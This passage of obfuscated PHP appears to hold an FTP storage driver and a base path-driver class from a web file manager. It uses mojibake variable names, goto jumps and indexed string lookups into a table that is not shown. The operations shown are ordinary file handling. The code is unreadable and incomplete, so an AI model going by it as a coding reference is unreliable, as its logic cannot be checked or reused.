$‹®™¬®­[8] . ltrim($êó³¢ıõ, $‹®™¬®­[8]); } private function _init($é«•‚ïà = array()) { $¶”ÙËŠ =& $_SERVER[Ùæõ‰Ï’]; if (!function_exists($¶”ÙËŠ[1452])) { throw new Exception(LNG($¶”ÙËŠ[1453])); } $this->config = $é«•‚ïà; $this->charsetReset($é«•‚ïà); foreach ($é«•‚ïà as $ÂÊŒ«Á => $ü×ß‡ĞÔ) { if (isset($this->{$ÂÊŒ«Á})) { $this->{$ÂÊŒ«Á} = $ü×ß‡ĞÔ; } } return $this->_login($é«•‚ïà); } private function _login($ŠÑæ³¦İ) { $“‚ Ô˜Ä =& $_SERVER[Ùæõ‰Ï’]; static $ëó›ô†™ = array(); $¿ÄĞÁ“ƒ = md5(json_encode($ŠÑæ³¦İ)); if (isset($ëó›ô†™[$¿ÄĞÁ“ƒ])) { foreach ($ëó›ô†™[$¿ÄĞÁ“ƒ] as $óßÁÉ·… => $Ìòƒûí²) { $this->{$óßÁÉ·…} = $Ìòƒûí²; } return !0; } $Ö†É‘×Ã = parse_url(trim($this->server, $“‚ Ô˜Ä[8])); $this->host = $Ö†É‘×Ã[$“‚ Ô˜Ä[208]]; $½ß­£õ† = isset($Ö†É‘×Ã[$“‚ Ô˜Ä[207]]) && $Ö†É‘×Ã[$“‚ Ô˜Ä[207]] == $“‚ Ô˜Ä[1454] ? !0 : !1; $this->scheme = $½ß­£õ† ? $“‚ Ô˜Ä[1455] : $“‚ Ô˜Ä[1456]; $this->port = isset($Ö†É‘×Ã[$“‚ Ô˜Ä[209]]) ? $Ö†É‘×Ã[$“‚ Ô˜Ä[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($“‚ Ô˜Ä[1457]) . $this->host . $“‚ Ô˜Ä[4] . $this->port, !0); return !1; } $É—Üˆöµ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$É—Üˆöµ) { $this->writeLog(LNG($“‚ Ô˜Ä[1458]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¸¼ğú•¡ = $this->pasv == $“‚ Ô˜Ä[91] ? !0 : !1; @ftp_pasv($this->connect, $¸¼ğú•¡); $ëó›ô†™[$¿ÄĞÁ“ƒ] = array($“‚ Ô˜Ä[1459] => $this->connect, $“‚ Ô˜Ä[208] => $this->host, $“‚ Ô˜Ä[207] => $this->scheme, $“‚ Ô˜Ä[209] => $this->port); return $É—Üˆöµ; } private function _isconn($Ã÷Øá€ = true) { if (is_resource($this->connect)) { return !0; } if (!$Ã÷Øá€) { return !1; } return $this->_login($this->config); } public function mkfile($üúƒµÏõ, $ôä¼Òºİ = '', $™¹ã­òÉ = REPEAT_RENAME) { if ($this->setContent($üúƒµÏõ, $ôä¼Òºİ)) { return $this->getPathOuter($üúƒµÏõ); } $this->writeLog(LNG($_SERVER[Ùæõ‰Ï’][1460]), !0); return !1; } public function mkdir($¾¨Êâåœ, $»€ååÌœ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¾¨Êâåœ = $this->iconvSystem($¾¨Êâåœ); if ($this->_isFolder($¾¨Êâåœ) || @ftp_mkdir($this->connect, $¾¨Êâåœ)) { return $this->getPathOuter($¾¨Êâåœ); } if (!$this->mkdir($this->pathFather($¾¨Êâåœ))) { return !1; } if ($¾¨Êâåœ = @ftp_mkdir($this->connect, $¾¨Êâåœ)) { return $this->getPathOuter($¾¨Êâåœ); } $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][1461], !0); return !1; } public function copyFile($…‹¨´¤, $Ç«úä¤) { if (!$this->_isconn()) { return !1; } $Ó‡äâş® = $this->pathThis($this->iconvSystem($…‹¨´¤)); $ï¸®Ê”® = $this->tempFile($Ó‡äâş®); $ÎÌÑÆ¦³ = $this->iconvApp($ï¸®Ê”®); $this->download($…‹¨´¤, $ÎÌÑÆ¦³); $ş¼„£ë = $this->upload($Ç«úä¤, $ÎÌÑÆ¦³); $this->tempFileRemve($ï¸®Ê”®); return $ş¼„£ë; } public function moveFile($Ò¾ğ†µÂ, $í©•óèÈ) { if (!$this->_isconn()) { return !1; } $Ò¾ğ†µÂ = $this->iconvSystem($Ò¾ğ†µÂ); $í©•óèÈ = $this->iconvSystem($í©•óèÈ); $£Ø²óûÖ = @ftp_rename($this->connect, $Ò¾ğ†µÂ, $í©•óèÈ); if (!$£Ø²óûÖ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][1461], !0); return !1; } return $this->getPathOuter($í©•óèÈ); } public function delFile($ç™Ì•ÀÓ) { if (!$this->_isconn()) { return !1; } $ç™Ì•ÀÓ = $this->iconvSystem($ç™Ì•ÀÓ); $§èúÓí = @ftp_delete($this->connect, $ç™Ì•ÀÓ); if (!$§èúÓí) { $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][1461], !0); } return $§èúÓí; } public function delFolder($ÁæÄØØ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $½¢ªæëí = $Â¨Éõ†ƒ = array(); $this->fileList($ÁæÄØØ, $½¢ªæëí, $Â¨Éõ†ƒ, !0); $this->listItemCache = !0; foreach ($Â¨Éõ†ƒ as $·›Ë„) { $úÕÙäÙæ = $this->iconvSystem($·›Ë„[$_SERVER[Ùæõ‰Ï’][32]]); $‚Š²‡’Ã = @ftp_delete($this->connect, $úÕÙäÙæ); if (!$‚Š²‡’Ã) { return !1; } } foreach ($½¢ªæëí as $úÕÙäÙæ) { $úÕÙäÙæ = $this->iconvSystem($úÕÙäÙæ); $‚Š²‡’Ã = @ftp_rmdir($this->connect, $úÕÙäÙæ); if (!$‚Š²‡’Ã) { return !1; } } $ÁæÄØØ = $this->iconvSystem($ÁæÄØØ); return @ftp_rmdir($this->connect, $ÁæÄØØ); } public function rename($íÈ‹ëøÒ, $ÓªÌÌŸ«) { $Ô¹¼ø…Ô =& $_SERVER[Ùæõ‰Ï’]; if (!$this->_isconn()) { return !1; } $ŞÙÛ©ßï = $this->fileNameAuto($this->pathFather($íÈ‹ëøÒ), $ÓªÌÌŸ«); $ŞÙÛ©ßï = $this->iconvSystem($ŞÙÛ©ßï); $íÈ‹ëøÒ = $this->iconvSystem($íÈ‹ëøÒ); $òÉÃÓ•Š = $this->pathFather($íÈ‹ëøÒ); $§ƒ‘øº¹ = rtrim($òÉÃÓ•Š, $Ô¹¼ø…Ô[8]) . $Ô¹¼ø…Ô[8] . $ŞÙÛ©ßï; $ÆĞ¾¨Ñô = @ftp_rename($this->connect, $íÈ‹ëøÒ, $§ƒ‘øº¹); if (!$ÆĞ¾¨Ñô) { $this->writeLog(__FUNCTION__ . $Ô¹¼ø…Ô[1461], !0); return !1; } $§ƒ‘øº¹ = $this->iconvApp($§ƒ‘øº¹); return $this->getPathOuter($§ƒ‘øº¹); } private function folderInfo($şÄ·®Ü, $É±Î‹²î = false) { $¦ü§ëÏĞ =& $_SERVER[Ùæõ‰Ï’]; $Ë™ƒİÌÉ = array($¦ü§ëÏĞ[32] => $this->pathThis($şÄ·®Ü), $¦ü§ëÏĞ[87] => $this->getPathOuter($¦ü§ëÏĞ[8] . $şÄ·®Ü), $¦ü§ëÏĞ[33] => $¦ü§ëÏĞ[78]); if ($É±Î‹²î) { return $Ë™ƒİÌÉ; } $Ë™ƒİÌÉ[$¦ü§ëÏĞ[231]] = $Ë™ƒİÌÉ[$¦ü§ëÏĞ[88]] = 0; $Ë™ƒİÌÉ[$¦ü§ëÏĞ[232]] = $Ë™ƒİÌÉ[$¦ü§ëÏĞ[233]] = !0; return $Ë™ƒİÌÉ; } private function fileInfo($ı˜„ĞßÕ, $Ôé³µÖ† = false, $º¾ÇÒ´í = array()) { $ö ·Í• =& $_SERVER[Ùæõ‰Ï’]; $õ¿çŸ¸ö = array($ö ·Í•[32] => $this->pathThis($ı˜„ĞßÕ), $ö ·Í•[87] => $this->getPathOuter($ö ·Í•[8] . $ı˜„ĞßÕ), $ö ·Í•[33] => $ö ·Í•[230], $ö ·Í•[79] => isset($º¾ÇÒ´í[$ö ·Í•[79]]) ? $º¾ÇÒ´í[$ö ·Í•[79]] : 0, $ö ·Í•[169] => $this->ext($ı˜„ĞßÕ)); if ($Ôé³µÖ†) { return $õ¿çŸ¸ö; } $õ¿çŸ¸ö[$ö ·Í•[231]] = $õ¿çŸ¸ö[$ö ·Í•[88]] = 0; $õ¿çŸ¸ö[$ö ·Í•[232]] = $õ¿çŸ¸ö[$ö ·Í•[233]] = !0; $Ú€Ëå‹ = $this->iconvSystem($ı˜„ĞßÕ); $õ¿çŸ¸ö[$ö ·Í•[88]] = @ftp_mdtm($this->connect, $Ú€Ëå‹); if (empty($º¾ÇÒ´í)) { $º¾ÇÒ´í = $this->objectMeta($ı˜„ĞßÕ); if (!$º¾ÇÒ´í) { return $õ¿çŸ¸ö; } } $õ¿çŸ¸ö[$ö ·Í•[79]] = $º¾ÇÒ´í[$ö ·Í•[79]]; return $õ¿çŸ¸ö; } public function size($‚üÖª‹¬) { $¹‹­¡­Ã = $this->objectMeta($‚üÖª‹¬); return $¹‹­¡­Ã ? $¹‹­¡­Ã[$_SERVER[Ùæõ‰Ï’][79]] : 0; } public function info($À­î) { if ($this->isFile($À­î)) { return $this->fileInfo($À­î, 0); } else { if ($this->isFolder($À­î)) { return $this->folderInfo($À­î); } } return !1; } private function fileList($çÎı±±õ, &$°Áá¦ëÚ, &$¿ÆæÃÜÁ, $Õğ¡¸ùŒ = false) { $”Ô±Ô‘¢ =& $_SERVER[Ùæõ‰Ï’]; $çÎı±±õ = $this->iconvSystem($çÎı±±õ); if (!$this->isFolder($çÎı±±õ)) { return !1; } @ftp_chdir($this->connect, $”Ô±Ô‘¢[8]); $çÎı±±õ = rtrim($çÎı±±õ, $”Ô±Ô‘¢[8]) . $”Ô±Ô‘¢[8]; check_abort(); $ŞÌ¦îÑÀ = @ftp_rawlist($this->connect, $çÎı±±õ); if (!$ŞÌ¦îÑÀ) { $ŞÌ¦îÑÀ = array(); } $†“…°ìş = array($”Ô±Ô‘¢[10] => 1, $”Ô±Ô‘¢[1376] => 1); foreach ($ŞÌ¦îÑÀ as $™È±î‡Ñ) { $’Ë®åÃ³ = $this->_listItem($™È±î‡Ñ); if ($’Ë®åÃ³[0] == $”Ô±Ô‘¢[841]) { continue; } $Á¨Œ±¾« = $’Ë®åÃ³[8]; if (empty($Á¨Œ±¾«) && $Á¨Œ±¾« !== $”Ô±Ô‘¢[228] || isset($†“…°ìş[$Á¨Œ±¾«])) { continue; } $Á¨Œ±¾« = $this->iconvApp($çÎı±±õ . ltrim($Á¨Œ±¾«, $”Ô±Ô‘¢[8])); $Õâ¼„¶ = array($”Ô±Ô‘¢[32] => $Á¨Œ±¾«, $”Ô±Ô‘¢[33] => $”Ô±Ô‘¢[230], $”Ô±Ô‘¢[79] => $’Ë®åÃ³[4]); if (substr($™È±î‡Ñ, 0, 1) == $”Ô±Ô‘¢[1462]) { $Õâ¼„¶[$”Ô±Ô‘¢[33]] = $”Ô±Ô‘¢[78]; $Õâ¼„¶[$”Ô±Ô‘¢[79]] = 0; } $Ã±åÔâõ = $Õâ¼„¶[$”Ô±Ô‘¢[33]] == $”Ô±Ô‘¢[78] ? !0 : !1; $this->cacheMethodInfoSet($Á¨Œ±¾«, $Ã±åÔâõ, $Õâ¼„¶); if ($Ã±åÔâõ) { $°Áá¦ëÚ[] = $Á¨Œ±¾«; if ($Õğ¡¸ùŒ) { $this->fileList($Á¨Œ±¾«, $°Áá¦ëÚ, $¿ÆæÃÜÁ, $Õğ¡¸ùŒ); } continue; } $¿ÆæÃÜÁ[] = $Õâ¼„¶; } $this->cacheMethodInfoSet($çÎı±±õ, !0); } private function _listItem($§İØŠ·) { if (empty($§İØŠ·)) { return array(); } $â–‘ÇäŞ = preg_split($_SERVER[Ùæõ‰Ï’][1463], $§İØŠ·); if (count($â–‘ÇäŞ) <= 9) { return $â–‘ÇäŞ; } $â–‘ÇäŞ[8] = trim(substr($§İØŠ·, strpos($§İØŠ·, $â–‘ÇäŞ[7]) + strlen($â–‘ÇäŞ[7]))); return array_splice($â–‘ÇäŞ, 0, 9); } public function listPath($–‰ü³‰, $øƒÜ£¿¾ = false) { $¶ÑèÉÎú =& $_SERVER[Ùæõ‰Ï’]; if (!$this->_isconn()) { return !1; } $Á©Ç° = $™©«¶·’ = array(); $this->fileList($–‰ü³‰, $Á©Ç°, $™©«¶·’); foreach ($Á©Ç° as $‘âñƒó => $°¼õêš) { $Á©Ç°[$‘âñƒó] = $this->folderInfo($°¼õêš, $øƒÜ£¿¾); } foreach ($™©«¶·’ as $‘âñƒó => $°¼õêš) { $™©«¶·’[$‘âñƒó] = $this->fileInfo($°¼õêš[$¶ÑèÉÎú[32]], $øƒÜ£¿¾, $°¼õêš); } return array($¶ÑèÉÎú[85] => $Á©Ç°, $¶ÑèÉÎú[86] => $™©«¶·’); } public function has($…—ôÊ°¹, $°×­ö® = false, $–Ñš‹öş = true) { $Ííş±†¢ =& $_SERVER[Ùæõ‰Ï’]; $Ùığü¹ = $·ºÌ­Àâ = array(); $ûÛÕ—Î„ = $°×­ö® ? !0 : !1; $this->fileList($…—ôÊ°¹, $Ùığü¹, $·ºÌ­Àâ, $ûÛÕ—Î„); if ($°×­ö®) { return array($Ííş±†¢[239] => count($·ºÌ­Àâ), $Ííş±†¢[240] => count($Ùığü¹)); } if ($–Ñš‹öş) { if (count($·ºÌ­Àâ)) { return !0; } } else { if (count($Ùığü¹)) { return !0; } } return !1; } public function listAll($Æ¸İ¢úŠ) { $‘»îô¹• =& $_SERVER[Ùæõ‰Ï’]; if (!$this->_isconn()) { return !1; } $…§„¾şÙ = $ªë‘ÃÔÏ = array(); $this->fileList($Æ¸İ¢úŠ, $…§„¾şÙ, $ªë‘ÃÔÏ, !0); $áğÓúŸ± = array_to_keyvalue($ªë‘ÃÔÏ, $‘»îô¹•[32]); foreach ($…§„¾şÙ as $Ø“¯Î¨´) { if (is_string($Ø“¯Î¨´)) { $áğÓúŸ±[$Ø“¯Î¨´] = array($‘»îô¹•[79] => 0); } } return $this->listAllFiles($Æ¸İ¢úŠ, $áğÓúŸ±); } public function getContent($˜ĞÁĞì) { if (!$this->_isconn()) { return !1; } $˜ĞÁĞì = $this->iconvSystem($˜ĞÁĞì); return $this->fileSubstr($˜ĞÁĞì); } public function setContent($õ¹Æ±§£, $„î˜¢Ø = '') { if (!$this->_isconn()) { return !1; } $„Êˆ©Å¶ = $this->pathThis($this->iconvSystem($õ¹Æ±§£)); $©·ûÖæ = $this->tempFile($„Êˆ©Å¶); file_put_contents($©·ûÖæ, $„î˜¢Ø); $ÙŒ¨Úõ = $this->upload($õ¹Æ±§£, $this->iconvApp($©·ûÖæ)); $this->tempFileRemve($©·ûÖæ); return $ÙŒ¨Úõ; } public function fileSubstr($¹ößÈäî, $¯—Éö = 0, $áŞ‹¤Œ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¹ößÈäî, $¯—Éö, $áŞ‹¤Œ); } private function ftpRequest($Ù‹¼š¤”, $ÛàÎï¿ = 0, $ƒÜâ—şµ = false) { $Ù‹¼š¤” = $this->iconvSystem($Ù‹¼š¤”); $Œçº¤ö = $this->scheme . $this->host . $_SERVER[Ùæõ‰Ï’][4] . $this->port; $é¡šş´™ = curl_init(); curl_setopt($é¡šş´™, CURLOPT_URL, $Œçº¤ö . $this->pathEncode($Ù‹¼š¤”)); curl_setopt($é¡šş´™, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ƒÜâ—şµ) { $’Ó÷ï–Õ = $ÛàÎï¿ + $ƒÜâ—şµ - 1; curl_setopt($é¡šş´™, CURLOPT_RANGE, "{$ÛàÎï¿}\55{$’Ó÷ï–Õ}"); } curl_setopt($é¡šş´™, CURLOPT_RETURNTRANSFER, 1); $Ñ¦Ï®åÁ = curl_exec($é¡šş´™); curl_close($é¡šş´™); return $Ñ¦Ï®åÁ; } public function upload($•Æ¾¡ï™, $ğßùÔ¡‡, $ø‚Ó½‘ç = false, $ò²€Í„¸ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($•Æ¾¡ï™))) { return !1; } $•Æ¾¡ï™ = $this->iconvSystem($•Æ¾¡ï™); $ğßùÔ¡‡ = $this->iconvSystem($ğßùÔ¡‡); $‡ØÏ¨° = ftp_nb_put($this->connect, $•Æ¾¡ï™, $ğßùÔ¡‡, FTP_BINARY); while ($‡ØÏ¨° == FTP_MOREDATA) { $‡ØÏ¨° = ftp_nb_continue($this->connect); } if ($‡ØÏ¨° != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][1461], !0); return !1; } return $this->getPathOuter($•Æ¾¡ï™); } public function download($Ÿ¹˜Ñ®Î, $ˆ­À¤şÌ = '') { if (!$this->_isconn()) { return !1; } $ï¹ãîÜ· = $this->pathFather($ˆ­À¤şÌ); if (!IO::mkdir($ï¹ãîÜ·)) { return !1; } $Ÿ¹˜Ñ®Î = $this->iconvSystem($Ÿ¹˜Ñ®Î); $ˆ­À¤şÌ = $this->iconvSystem($ˆ­À¤şÌ); $é¬Óß¿› = ftp_nb_get($this->connect, $ˆ­À¤şÌ, $Ÿ¹˜Ñ®Î, FTP_BINARY); while ($é¬Óß¿› == FTP_MOREDATA) { $é¬Óß¿› = ftp_nb_continue($this->connect); } if ($é¬Óß¿› != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][1461], !0); return !1; } return $this->iconvApp($ˆ­À¤şÌ); } public function exist($™Èˆö÷) { return $this->isFile($™Èˆö÷) || $this->isFolder($™Èˆö÷); } public function isFile($¼àŸê¬º) { return !$this->isFolder($¼àŸê¬º) && $this->objectMeta($¼àŸê¬º); } public function isFolder($å™¾Ú«„) { return $this->cacheMethod($_SERVER[Ùæõ‰Ï’][179], $å™¾Ú«„); } protected function objectMeta($ÇÔıØ€¨) { return $this->cacheMethod($_SERVER[Ùæõ‰Ï’][181], $ÇÔıØ€¨); } protected function _objectMeta($îæü• ) { $ìãáÀÖß =& $_SERVER[Ùæõ‰Ï’]; if ($îæü•  == $ìãáÀÖß[12] || $îæü•  == $ìãáÀÖß[8]) { return array(); } if (!$this->_isconn()) { return !1; } $îæü•  = $this->iconvSystem($îæü• ); $«Æ•¶Æ› = array($ìãáÀÖß[32] => $this->iconvApp($îæü• ), $ìãáÀÖß[33] => $ìãáÀÖß[230], $ìãáÀÖß[79] => 0); @ftp_chdir($this->connect, $ìãáÀÖß[8]); $ñÈñ¾³à = @ftp_size($this->connect, $îæü• ); if ($ñÈñ¾³à != -1) { $«Æ•¶Æ›[$ìãáÀÖß[79]] = $ñÈñ¾³à; } else { $œ¨¦ä­® = @ftp_chdir($this->connect, $îæü• ); if (!$œ¨¦ä­®) { return !1; } $«Æ•¶Æ›[$ìãáÀÖß[33]] = $ìãáÀÖß[78]; } return $«Æ•¶Æ›; } protected function _isFolder($ÁĞ“û·Ú) { $§îô°­´ =& $_SERVER[Ùæõ‰Ï’]; if ($ÁĞ“û·Ú == $§îô°­´[12] || $ÁĞ“û·Ú == $§îô°­´[8]) { return !0; } $™Ãïöõã = $this->_objectMeta($ÁĞ“û·Ú); return isset($™Ãïöõã[$§îô°­´[33]]) && $™Ãïöõã[$§îô°­´[33]] == $§îô°­´[78] ? !0 : !1; } } goto D¶Ûâº„â; a­Ç˜ïŸùì: define($_SERVER[Ùæõ‰Ï’][317], 3); define($_SERVER[Ùæõ‰Ï’][318], 1); define($_SERVER[Ùæõ‰Ï’][319], 0); goto eºî‹ö’; b°–È¹Œî½: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $»Ïâ”Å© =& $_SERVER[Ùæõ‰Ï’]; $this->objectDriver = array($»Ïâ”Å©[60], $»Ïâ”Å©[61], $»Ïâ”Å©[62], $»Ïâ”Å©[63], $»Ïâ”Å©[64], $»Ïâ”Å©[65], $»Ïâ”Å©[66], $»Ïâ”Å©[67], $»Ïâ”Å©[68], $»Ïâ”Å©[69], $»Ïâ”Å©[70], $»Ïâ”Å©[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($‡öìãË´) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($‡öìãË´, $_SERVER[Ùæõ‰Ï’][8]); } return $‡öìãË´; } public function iconvApp($®‡°ÃÈ) { return $®‡°ÃÈ; } public function iconvSystem($æÊ“ğµ) { return $æÊ“ğµ; } public function iconvTo($®‹£½, $éä„ËıÄ, $äá¢ÈÚ») { $Ô»®÷®Ç =& $_SERVER[Ùæõ‰Ï’]; if (!$®‹£½ || !function_exists($Ô»®÷®Ç[72])) { return $®‹£½; } static $¡¤Å ¥Æ = array(); $üûì›ËÉ = $éä„ËıÄ . $Ô»®÷®Ç[73] . $äá¢ÈÚ» . $Ô»®÷®Ç[74] . $®‹£½; if (isset($¡¤Å ¥Æ[$üûì›ËÉ])) { return $¡¤Å ¥Æ[$üûì›ËÉ]; } if (function_exists($Ô»®÷®Ç[75])) { $ÄšøÔØ = @mb_convert_encoding($®‹£½, $äá¢ÈÚ», $éä„ËıÄ); } else { $ÄšøÔØ = @iconv($éä„ËıÄ, $äá¢ÈÚ», $®‹£½); } $ÄšøÔØ = $ÄšøÔØ ? $ÄšøÔØ : $®‹£½; if (strstr($ÄšøÔØ, $Ô»®÷®Ç[76])) { $ÄšøÔØ = str_replace($Ô»®÷®Ç[76], $Ô»®÷®Ç[11], $ÄšøÔØ); } $¡¤Å ¥Æ[$éä„ËıÄ . $Ô»®÷®Ç[73] . $äá¢ÈÚ» . $Ô»®÷®Ç[74] . $®‹£½] = $ÄšøÔØ; $¡¤Å ¥Æ[$äá¢ÈÚ» . $Ô»®÷®Ç[73] . $éä„ËıÄ . $Ô»®÷®Ç[74] . $®‹£½] = $®‹£½; $¡¤Å ¥Æ[$äá¢ÈÚ» . $Ô»®÷®Ç[73] . $éä„ËıÄ . $Ô»®÷®Ç[74] . $ÄšøÔØ] = $®‹£½; $¡¤Å ¥Æ[$éä„ËıÄ . $Ô»®÷®Ç[73] . $äá¢ÈÚ» . $Ô»®÷®Ç[74] . $ÄšøÔØ] = $ÄšøÔØ; return $ÄšøÔØ; } public function getPathInner($”åûâŸ—) { $êõñ‹ÂÈ = IO::init($”åûâŸ—); return $êõñ‹ÂÈ->path; } public function getPathOuter($®Şò£…) { $ª‚Øâäó =& $_SERVER[Ùæõ‰Ï’]; $çì®È¿ç = strlen(trim($this->pathBase, $ª‚Øâäó[8])); $®Şò£… = substr(trim($®Şò£…, $ª‚Øâäó[8]), $çì®È¿ç); return $this->pathDriver . $ª‚Øâäó[8] . ltrim($®Şò£…, $ª‚Øâäó[8]); } public function isParentOf($üè¶Œ‰”, $ÊãğÒİø) { $È¿ƒƒÖÙ =& $_SERVER[Ùæõ‰Ï’]; $üè¶Œ‰” = rtrim(strtolower($üè¶Œ‰”), $È¿ƒƒÖÙ[8]) . $È¿ƒƒÖÙ[8]; $ÊãğÒİø = rtrim(strtolower($ÊãğÒİø), $È¿ƒƒÖÙ[8]) . $È¿ƒƒÖÙ[8]; $–„ôƒò“ = strpos($ÊãğÒİø, $üè¶Œ‰”) === 0; return $–„ôƒò“; } public function getType() { $ı®ú¨â£ =& $_SERVER[Ùæõ‰Ï’]; $÷ƒ÷‚Ô¸ = str_replace($ı®ú¨â£[77], $ı®ú¨â£[12], get_class($this)); return strtolower($÷ƒ÷‚Ô¸); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($˜Äãº¤İ, $Ôİ¿ìô×) { $õÂ­¬Æ =& $_SERVER[Ùæõ‰Ï’]; $·„³İò = rtrim($˜Äãº¤İ, $õÂ­¬Æ[8]) . $õÂ­¬Æ[8] . $Ôİ¿ìô×; $§–öù°ô = $this->exist($·„³İò); return $§–öù°ô ? $·„³İò : !1; } public function setModifyTime($Ûş¯©¹ƒ, $š†ÉÅëÃ = '') { } public function renameObject($“à¢„Î§, $âïÍËÃİ) { $ÏÌ“×º› = $âïÍËÃİ; $“à¢„Î§ = $this->getPathOuter($“à¢„Î§); $âïÍËÃİ = $this->pathFather($“à¢„Î§) . $âïÍËÃİ; $¿ÜÏ˜ù = IO::copy($“à¢„Î§, $this->pathFather($“à¢„Î§), REPEAT_RENAME_FOLDER, $ÏÌ“×º›); if ($¿ÜÏ˜ù) { IO::remove($“à¢„Î§); } return $¿ÜÏ˜ù ? $âïÍËÃİ : !1; } public function tempFile($­İéËÖ = '', $ê¨³£ê« = '') { if (!$­İéËÖ) { $­İéËÖ = rand_string(15); } $ÉÌı€ËÙ = TEMP_FILES . rand_string(15) . $_SERVER[Ùæõ‰Ï’][8]; @mkdir($ÉÌı€ËÙ, DEFAULT_PERRMISSIONS, !0); $ÑìÈÕ„“ = $ÉÌı€ËÙ . $­İéËÖ; @touch($ÑìÈÕ„“); if ($ê¨³£ê«) { file_put_contents($ÑìÈÕ„“, $ê¨³£ê«); } return $ÑìÈÕ„“; } public function tempFileRemve($¶ èŸø) { @unlink($¶ èŸø); @rmdir($this->pathFather($¶ èŸø)); } public function mkfile($ìßíûâ™, $¯¦ŸóÈ = '', $ã–å…• = REPEAT_RENAME) { } public function mkdir($óø„•ß, $¤ç·ºş = REPEAT_SKIP) { } public function delFile($å³“Ú‰) { } public function delFolder($¥¤˜Ä®) { } public function copyFile($·„ô¹Ó´, $û íšØç) { } public function moveFile($¡‹÷ÀÕ„, $À¥àÌÜŸ) { } public function remove($İÅÂóƒ) { if ($this->isFile($İÅÂóƒ)) { return $this->delFile($İÅÂóƒ); } return $this->delFolder($İÅÂóƒ); } public function rename($È¹ØÆ“Ñ, $ÎÚıö•Ì) { } public function exist($¯Õõê˜Ò) { } public function findByHash($Ô§å¥‘Ò = '', $ì®†Ø¢” = '') { return !1; } public function isFile($íï¸ƒÁ‘) { } public function isFolder($­Ø—îÙ) { } public function size($ÓíÅ©šÈ) { } public function info($˜ÀÆÜ‡ö) { } public function infoSimple($¾óŞ©Â”) { return $this->info($¾óŞ©Â”); } public function infoAuth($ËĞ¦ş«õ) { return $this->info($ËĞ¦ş«õ); } public function infoFull($ä®Ğ‰š°) { return $this->info($ä®Ğ‰š°); } public function infoFullSimple($¬ÍÛáğó) { return $this->info($¬ÍÛáğó); } public function infoWithChildren($Şµùà¿í) { $ÁòÚíØÚ =& $_SERVER[Ùæõ‰Ï’]; static $Ûê—Ôî» = array(); if (isset($Ûê—Ôî»[$Şµùà¿í])) { return $Ûê—Ôî»[$Şµùà¿í]; } $‰¯øŒ’¿ = $this->info($Şµùà¿í); if ($‰¯øŒ’¿ && $‰¯øŒ’¿[$ÁòÚíØÚ[33]] == $ÁòÚíØÚ[78]) { $¡‘Í¼â– = array($ÁòÚíØÚ[79] => 0, $ÁòÚíØÚ[80] => 0, $ÁòÚíØÚ[81] => 0); $this->infoChildren($Şµùà¿í, $¡‘Í¼â–); $‰¯øŒ’¿[$ÁòÚíØÚ[79]] = $¡‘Í¼â–[$ÁòÚíØÚ[79]]; $‰¯øŒ’¿[$ÁòÚíØÚ[82]] = array($ÁòÚíØÚ[83] => $¡‘Í¼â–[$ÁòÚíØÚ[80]], $ÁòÚíØÚ[84] => $¡‘Í¼â–[$ÁòÚíØÚ[81]]); $Ûê—Ôî»[$Şµùà¿í] = $‰¯øŒ’¿; } return $‰¯øŒ’¿; } public function listPath($´İİÃö, $ß¹Ì¹ = false) { } public function has($ÁúŒÊ×, $ò€ª½¶à = false, $””Æ©ÂŒ = false) { } public function canRead($–´ºÜø­) { } public function canWrite($•‰÷¢§) { } public function getContent($¥Šì§õâ) { } public function setContent($ƒ¾ä£ÛÉ, $øù®õ = '') { } protected function infoChildren($¥ßéœĞû, &$”áÏıåÉ) { $–Ùˆ²¸Ø =& $_SERVER[Ùæõ‰Ï’]; check_abort_echo(); $±™ş®µ = $this->listPath($¥ßéœĞû, !0); $±™ş®µ = array_merge($±™ş®µ[$–Ùˆ²¸Ø[85]], $±™ş®µ[$–Ùˆ²¸Ø[86]]); foreach ($±™ş®µ as $¢µİ‚½Ô) { if ($¢µİ‚½Ô[$–Ùˆ²¸Ø[33]] == $–Ùˆ²¸Ø[78]) { $”áÏıåÉ[$–Ùˆ²¸Ø[81]]++; $ûÙ«ÎÎ× = $this->getPathInner($¢µİ‚½Ô[$–Ùˆ²¸Ø[87]]); $this->infoChildren($ûÙ«ÎÎ×, $”áÏıåÉ); } else { $”áÏıåÉ[$–Ùˆ²¸Ø[80]]++; $”áÏıåÉ[$–Ùˆ²¸Ø[79]] += $¢µİ‚½Ô[$–Ùˆ²¸Ø[79]]; } } } public function fileSubstr($ÕÁëÖÓÄ, $´º¯öÉ„, $¯š™Ç¸…) { } public function listAll($†¡¡’«Ù) { } public function listAllMake($Şöú¿‡ú, &$±ÍŒã“) { $°Æ¼Ş¥² =& $_SERVER[Ùæõ‰Ï’]; check_abort_echo(); $©ªõµ˜í = $this->listPath($Şöú¿‡ú, !0); if (!$©ªõµ˜í) { return; } $ŒÃïü–Ô = array_merge($©ªõµ˜í[$°Æ¼Ş¥²[85]], $©ªõµ˜í[$°Æ¼Ş¥²[86]]); foreach ($ŒÃïü–Ô as $©ÇÓ´ƒÅ) { $Ñ‹ßêË = $©ÇÓ´ƒÅ[$°Æ¼Ş¥²[33]] == $°Æ¼Ş¥²[78]; $³§«ÊÃÓ = array($°Æ¼Ş¥²[87] => $©ÇÓ´ƒÅ[$°Æ¼Ş¥²[87]], $°Æ¼Ş¥²[78] => 